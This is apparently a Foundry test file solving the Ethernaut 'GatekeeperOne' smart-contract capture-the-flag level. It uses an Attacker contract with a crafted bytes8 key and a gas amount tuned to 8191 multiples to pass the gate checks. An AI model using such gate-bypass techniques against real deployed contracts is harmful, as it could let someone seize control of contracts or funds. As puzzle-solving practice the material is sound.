// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

contract GatekeeperOneTest is Test {

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6655846);
    }

    function test_Enter() public {
        // GatekeeperOne gatekeeperOne = GatekeeperOne(0x6c7EF5C8cab660fF20304Ef08C375E889eFa9219);
        GatekeeperOne gatekeeperOne = new GatekeeperOne();
        
        Attacker attacker = new Attacker();
        
        console.log((gatekeeperOne.entrant()));

        bytes8 key = bytes8(uint64(uint16(uint160(address(this)))) + 2**32);

        uint256 gasToUse = 8191 * 10 + 100; // 确保有充足的gas并是8191的倍数

        attacker.attack(key, address(gatekeeperOne));

        console.log(gatekeeperOne.entrant());
    }

}

contract Attacker {

    function attack(bytes8 _gateKey, address gateAddress) public {
        GatekeeperOne gatekeeperOne = GatekeeperOne(gateAddress);

        uint256 gasToUse = 8191 * 3; 

        gatekeeperOne.enter{gas: gasToUse}(_gateKey);
    }
}
